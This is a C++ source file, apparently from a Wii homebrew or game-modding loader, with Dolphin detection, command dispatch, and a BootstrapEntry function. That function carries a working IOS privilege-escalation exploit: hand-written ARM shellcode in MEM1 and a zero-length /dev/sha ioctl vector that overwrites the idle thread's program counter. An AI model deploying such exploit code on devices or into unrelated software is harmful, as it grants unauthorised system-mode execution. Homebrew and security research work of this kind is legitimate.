#include "StarlingIOS.hpp"
#include <AddressMap.h>
#include <CPUCache.hpp>
#include <DeviceStarlingTypes.hpp>
#include <IOS.hpp>
#include <Log.hpp>
#include <SHA.hpp>
#include <optional>

/**
 * Check if running on Dolphin Emulator. This can be useful for debugging or
 * features that don't require Starling IOS.
 */
bool StarlingIOS::IsDolphin()
{
    static std::optional<bool> s_isDolphin;

    if (s_isDolphin.has_value()) {
        return s_isDolphin.value();
    }

    // Modern versions
    IOS::Resource dolphin("/dev/dolphin", IOS::Mode::NONE);
    if (dolphin.GetFd() >= 0) {
        return *(s_isDolphin = true);
    }

    // Old versions
    IOS::Resource sha("/dev/sha", IOS::Mode::NONE);
    if (sha.GetFd() < 0) {
        return *(s_isDolphin = true);
    }

    return *(s_isDolphin = false);
}

/**
 * Flush the data cache range on PPC and invalidate the data cache range on
 * ARM.
 */
void StarlingIOS::SafeFlush(const void* start, u32 size)
{
    // The IPC function flushes the cache here on PPC, and then IOS invalidates
    // its own cache. IOS doesn't check for the invalid fd before doing what we
    // want.
    IOS_Write(-1, start, size);
}

static u32 ReadMessage(u32 index)
{
    return ReadU32((IOS_BOOT_MSG_ADDRESS + index * 4) | 0xC0000000);
}

static void WriteMessage(u32 index, u32 message)
{
    WriteU32((IOS_BOOT_MSG_ADDRESS + index * 4) | 0xC0000000, message);
}

// Perform an IOS exploit and branch to the entrypoint in system mode.
//
// Exploit summary:
// - IOS does not check validation of vectors with length 0.
// - All memory regions mapped as readable are executable (ARMv5 has no 'no
// execute' flag).
// - NULL/0 points to the beginning of MEM1.
// - The /dev/sha resource manager, part of IOSC, runs in system mode.
// - It's obvious basically none of the code was audited at all.
//
// IOCTL 0 (SHA1_Init) writes to the context vector (1) without checking the
// length at all. Two of the 32-bit values it initializes are zero.
//
// Common approach: Point the context vector to the LR on the stack and then
// take control after return. A much more stable approach taken here: Overwrite
// the PC of the idle thread, which should always have its context start at
// 0xFFFE0000 in memory (across IOS versions).
bool StarlingIOS::BootstrapEntry()
{
    // Dolphin defaults to UID 0 for standalone binaries
    if (IsDolphin()) {
        return true;
    }

    WriteMessage(0, 0);

    IOS::ResourceCtrl<SHA::SHAIoctl> sha("/dev/sha", IOS::Mode::NONE);
    if (sha.GetFd() < 0) {
        return false;
    }

    u32* mem1 = reinterpret_cast<u32*>(0x80000000);
    mem1[0] = 0x4903468D; // ldr r1, =stackptr; mov sp, r1;
    mem1[1] = 0x49034788; // ldr r1, =entrypoint; blx r1;
    // Overwrite reserved handler to loop infinitely
    mem1[2] = 0x49036209; // ldr r1, =0xFFFF0014; str r1, [r1, #0x20];
    mem1[3] = 0x47080000; // bx r1
    mem1[4] = (IOS_BOOT_STACK_ADDRESS + IOS_BOOT_STACK_MAXLEN) &
              0x7FFFFFFF; // stackptr
    mem1[5] = (IOS_BOOT_ADDRESS | 1) & 0x7FFFFFFF; // entrypoint
    mem1[6] = 0xFFFF0014; // reserved handler

    alignas(0x20) IOS::IOVector<1, 2> vectors = {};
    vectors.in[0].data = nullptr;
    vectors.in[0].len = 0;
    vectors.out[0].data = reinterpret_cast<void*>(0xFFFE0028);
    vectors.out[0].len = 0;
    // Unused vector utilized for cache safety
    vectors.out[1].data = reinterpret_cast<void*>(0x80000000);
    vectors.out[1].len = 0x20;

    // IOS_Ioctlv should never return an error if the exploit succeeded
    if (sha.Ioctlv(SHA::SHAIoctl::INIT, vectors) < 0) {
        return false;
    }

    while (ReadMessage(0) != 1) {
    }
    return true;
}

static IOS::ResourceCtrl<DeviceStarlingTypes::Ioctl> s_rm;

/**
 * Open the Starling IOS manager device (DeviceStarling). The result and
 * handle is managed by this interface.
 */
void StarlingIOS::RMOpen()
{
    if (s_rm.GetFd() < 0) {
        new (&s_rm) IOS::ResourceCtrl<DeviceStarlingTypes::Ioctl>(
            DeviceStarlingTypes::RM_PATH
        );
    }
}

/**
 * Close the Starling IOS manager device.
 */
void StarlingIOS::RMClose()
{
    s_rm.Close();
}

static struct {
    u32 diskId = DeviceStarlingTypes::MAX_DISK_COUNT;
} s_commandContext;

static bool s_enabledDisks[DeviceStarlingTypes::MAX_DISK_COUNT] = {};

/**
 * Handle a Starling IOS command.
 */
static void RMDispatchCommand(
    DeviceStarlingTypes::Command command, DeviceStarlingTypes::CommandData* data
)
{
    switch (command) {
    case DeviceStarlingTypes::Command::SELECT_DISK: {
        assert(data->disk.diskId < DeviceStarlingTypes::MAX_DISK_COUNT);
        s_commandContext.diskId = data->disk.diskId;
        s_enabledDisks[data->disk.diskId] = true;
        break;
    }

    case DeviceStarlingTypes::Command::REMOVE_DISK: {
        assert(data->disk.diskId < DeviceStarlingTypes::MAX_DISK_COUNT);
        s_enabledDisks[data->disk.diskId] = false;
        if (s_commandContext.diskId == data->disk.diskId) {
            s_commandContext.diskId = DeviceStarlingTypes::MAX_DISK_COUNT;
        }
        break;
    }

    case DeviceStarlingTypes::Command::INSERT_RIIVOLUTION_XML: {
        break;
    }

    default: {
        // Do nothing
        break;
    }
    };
}

/**
 * Handle commands from Starling IOS. This function blocks until a request
 * is received. Returns once Starling IOS is exhausted of commands.
 */
void StarlingIOS::RMHandleCommands()
{
    DeviceStarlingTypes::CommandData* data =
        reinterpret_cast<DeviceStarlingTypes::CommandData*>( //
            COMMAND_DATA_ADDRESS
        );

    s_commandContext = {};
    s_commandContext.diskId = DeviceStarlingTypes::MAX_DISK_COUNT;

    while (true) {
        s32 result = s_rm.Ioctl(
            DeviceStarlingTypes::Ioctl::RECEIVE_COMMAND, nullptr, 0, data,
            COMMAND_DATA_MAXLEN
        );

        if (result < 0) {
            PRINT(
                System, ERROR, "Received error from command hook: %d", result
            );
            break;
        }

        auto command = static_cast<DeviceStarlingTypes::Command>(result);
        RMDispatchCommand(command, data);

        if (command == DeviceStarlingTypes::Command::DONE) {
            break;
        }
    }
}
